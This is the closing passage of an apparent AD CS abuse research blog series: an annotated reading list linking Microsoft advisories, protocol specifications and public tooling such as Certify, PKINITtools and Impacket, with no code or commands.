Certify's escalation technique documentation, covering ESC1-ESC15 from the Windows-native tooling perspective.
https://github.com/GhostPack/Certify/wiki/4-%E2%80%90-Escalation-Techniques
 
---
 
### Microsoft Documentation
 
**KB5014754: Certificate-based authentication changes on Windows domain controllers**
Microsoft (2022)
The patch introducing strong certificate mapping, `szOID_NTDS_CA_SECURITY_EXT`, and `StrongCertificateBindingEnforcement`. Essential reading for ESC9 and ESC10 context.
https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
 
**MS-WCCE: Windows Client Certificate Enrollment Protocol**
Microsoft
Protocol specification for the primary CA enrollment RPC interface.
https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce
 
**MS-ICPR: ICertPassage Remote Protocol**
Microsoft
Protocol specification for the legacy MS-ICPR enrollment interface targeted by ESC11.
https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-icpr
 
**CVE-2024-49019 Security Guidance (ESC15)**
Microsoft (2024)
Official MSRC advisory for the EKUwu vulnerability.
https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019
 
---
 
### Supplementary Research
 
**NTLM Relaying to AD Certificate Services**
Dirk-jan Mollema (dirkjanm), 2021
Analysis of NTLM relay to HTTP enrollment endpoints, foundational for understanding ESC8.
https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/
 
**PKINITtools**
Dirk-jan Mollema (dirkjanm)
Toolset for PKINIT-based attacks and UnPAC-the-Hash, directly relevant to the cert-to-TGT chain.
https://github.com/dirkjanm/PKINITtools
 
**The Hacker Recipes: AD CS**
Shutdown / The Hacker Recipes
Practical reference documentation covering AD CS attack paths with tooling examples.
https://www.thehacker.recipes/ad/movement/ad-cs
 
**Impacket**
SecureAuth / Impacket contributors
The Python library underpinning most Linux-native AD CS exploitation tooling, including the ntlmrelayx `--adcs` implementation for ESC8.
https://github.com/fortra/impacket

---

*This post concludes the AD CS Abuse Research writeup series. The next phase covers lab setup, tool architecture, and the development of the unified enumeration and exploitation framework.*
